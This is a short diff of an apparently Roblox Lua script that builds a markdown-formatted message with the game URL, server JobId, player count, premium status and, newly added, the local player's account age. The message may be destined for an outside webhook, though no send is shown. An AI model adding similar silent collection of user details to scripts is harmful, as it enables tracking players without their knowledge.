@@ -31,6 +31,7 @@ local data = {
             .. "**Game URL:** ```" .. gameUrl .. "```\n"
 		    .. "**Server JobId :** ```" .. game.JobId .. "```\n"
             .. "**Server Number players online :** ```" .. playerCount .. "```\n"
+            .. "**Account Age :** ```" .. game:GetService("Players").LocalPlayer.AccountAge .. "``` \n" 
 			.. "**Player Premium :** ```" .. if hasPremium then "yes " else "no"  .. "```\n"
         }
     }
